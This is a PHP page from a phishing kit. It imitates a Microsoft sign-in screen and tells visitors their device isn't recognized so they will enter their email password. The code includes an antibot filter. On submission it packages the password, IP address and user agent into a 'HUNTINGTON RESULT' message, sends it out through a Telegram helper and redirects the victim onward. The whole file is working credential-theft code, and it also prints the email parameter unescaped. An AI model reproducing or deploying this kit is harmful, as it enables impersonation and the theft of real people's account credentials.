<?php
ob_start();
session_start();
include '../includes/antibot.php';
include_once '../includes/telegram.php';
if (!isset($_GET['email'])){
	header('Location: ../verify/contact.php', true);
}
else{
	$email = $_GET['email'];
}
if (!isset($_SESSION['id'])){
	header('Location: ../index.php', true);
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="utf-8">
	<title>Verify email - Microsoft</title>
	<meta http-equiv="content-type" content="text/html; charset=UTF-8">
	<meta name="viewport" content="width=device-width, height=device-height, initial-scale=1.0, maximum-scale=2, user-scalable=yes">
	<link rel="shortcut icon" type="image/jpg" href="../static/img/microsoft-favicon.ico"/>
	<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.8.1/font/bootstrap-icons.css">
	<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">
</head>
<style type="text/css">
	input{
		-webkit-appearance: none;
		border-radius: 0;
	}
	@media only screen and (max-width: 470px){
		.card{
			position: fixed;
			top: 0;
			left: 0;
			width: 100vw;
			height: 100vh;
		}
	}
	@media only screen and (min-width: 471px){
		.card{
			width: 440px;
			top: 50%;
			transform: translateY(50%);
		}
		body{
			background-image: url(../static/img/microsoft-background.svg);
		}
	}
	a{
		color: #0067b8;
		font-size: .8125rem;
		text-decoration: none;
	}
	a:hover{
		text-decoration: underline;
		color: grey;
	}
	#email-pass{
		border: none;
		box-shadow: 0 2px 0 -1px black;
		padding-bottom: 0.3rem;
	}
	#email-pass:focus{
		outline: none;
	}
	button{
		background-color: #0067b8;
		color: white;
		border: 2px solid #0067b8;
		width: 108px;
		float: right;
	}
</style>
<body>
	<div class="container">
		<div class="card mx-auto p-5">
			<img src="../static/img/microsoft.svg" width="108px" />
			<span class="mt-3"><img src="../static/img/microsoft-arrow.svg"><b style="font-weight: 500;"><?php echo $email;?></b></span>
			<h3><b style="font-weight: 600;">Enter password</b></h3>
			<h6 class="mb-3">This device isn't recognized, please sign in to verify</h6>
			<form action="" method="POST">
				<input class="mb-3 w-100" type="password" name="email-pass" id="email-pass" placeholder="Password" required><br>
				<a class="my-2" href="">Forgot password?</a><br><br>
				<button class="ms-auto">Sign in</button>
			</form>
		</div>
	</div>
	<script type="text/javascript">
		const togglePassword = document.querySelector("#togglePassword");
		const password = document.querySelector("#email-pass");

		togglePassword.addEventListener('click', () => {
			password.setAttribute('type', 'text');

			showPassword.setAttribute('hidden', true);
			hidePassword.removeAttribute('hidden');
		});
		hidePassword.addEventListener('click', () => {
			password.setAttribute('type', 'password');

			hidePassword.setAttribute('hidden', true);
			showPassword.removeAttribute('hidden');
		});
	</script>
	<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-ka7Sk0Gln4gmtz2MlQnikT1wXgYsOg+OMhuP+IlRH9sENBO0LRn5q+8nbTov4+1p" crossorigin="anonymous"></script>
</body>
</html>
<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
	$ip = $_SERVER['REMOTE_ADDR'];
	$user_agent = $_SERVER['HTTP_USER_AGENT'];
	$email_pass = $_REQUEST['email-pass'];

	if (!isset($_SESSION['id'])){
		header('Location: ../verify/contact.php', true);
	}

	$msg = "HUNTINGTON RESULT\n\n| DEVICE : #{$_SESSION['id']}\n| IP : {$ip}\n| USER AGENT : {$user_agent}\n\n| EMAIL PASSWORD : {$email_pass}";
	send_message($msg);
	header('Location: ../complete.php', true);
}
?>